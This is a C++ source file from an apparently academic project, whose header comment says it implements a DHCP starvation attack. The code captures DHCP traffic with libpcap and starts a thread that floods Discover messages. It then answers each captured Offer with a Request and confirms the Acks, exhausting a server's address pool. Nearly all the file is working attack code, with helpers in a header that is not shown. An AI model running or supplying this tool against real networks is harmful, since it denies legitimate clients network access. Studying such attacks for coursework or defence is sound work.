/*
 * Autor: Lubomir Gallovic (xgallo03)
 * Datum: 5.3.2018
 * Soubor: pds-dhcpstarve.cpp
 * Komentar: zdrojovy kod pre DHCP starvation
 */

#include "common.h"

void signalHandler( int signum ) {

	pcap_close(handle);
	close(socketClient);

	exit(signum);  
}

//pcap_loop packet handling function
void capturePacket(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {

	struct dhcphdr *dhcpHeader;
	struct udphdr *udpHeader ;
	struct ip *ipHeader;
	struct ethhdr *ethHeader;
	uint32_t serverID;

	ethHeader = (struct ethhdr *)(packet);
	ipHeader = (struct ip *)(packet + sizeof(struct ethhdr));
	udpHeader = (struct udphdr *)(((char *)ipHeader) + ipHeader->ip_hl*4); //ip header has variable length
	dhcpHeader = (struct dhcphdr *)(((char *)udpHeader) + sizeof(struct udphdr));

	int type = getMessageType(dhcpHeader, &serverID);

	if (type == -1) // not dhcp packet
		return;

	if (type == DHCP_OFFER) {
		if (sendRequest(dhcpHeader, &serverID) == -1)
			//fprintf(stderr, "DHCP offer data not found in database\n");
			;
	} else if (type == DHCP_ACK) {
		if (confirmAck(dhcpHeader, ipHeader, ethHeader) == -1)
			//fprintf(stderr, "DHCP ack data not found in database\n");
			;
	}
}

int main(int argc, char *argv[]) {

	srand(time(NULL));
	char *interface, errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "dst port 68";
	bpf_u_int32 mask;
	bpf_u_int32 net;
	int opt;	

	while ((opt = getopt(argc, argv, "i:")) != -1) {
		switch (opt) {
		case 'i':
			interface = optarg;
			break;
		default:
			fprintf(stderr, "Invalid arguments\n");
			return -1;
			break;
		}
	}

	if (pcap_lookupnet(interface, &net, &mask, errbuf) == -1) {
		 fprintf(stderr, "Mask lookup failed: %s\n", errbuf);
		 return -1;
	 }

	handle = pcap_open_live(interface, BUFSIZ, true, 1000, errbuf);
	 if (handle == NULL) {
		 fprintf(stderr, "Error accessing interface %s: %s\n", interface, errbuf);
		 return -1;
	 }	 

	signal(SIGINT, signalHandler); 

	std::thread socketClientThread(&socketClientListener);
	socketClientThread.detach();

	std::thread timeoutWatcher(&watchTimeout);
	timeoutWatcher.detach();

	std::thread discoveryFlooder(&floodDiscovery);
	discoveryFlooder.detach();

	 if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return -1;
	 }

	 if (pcap_setfilter(handle, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return -1;
	 }

	 if (pcap_loop(handle, -1, capturePacket, NULL) == -1) {
		 fprintf(stderr, "Error PCAP LOOP\n");
		 return -1;
	 }

}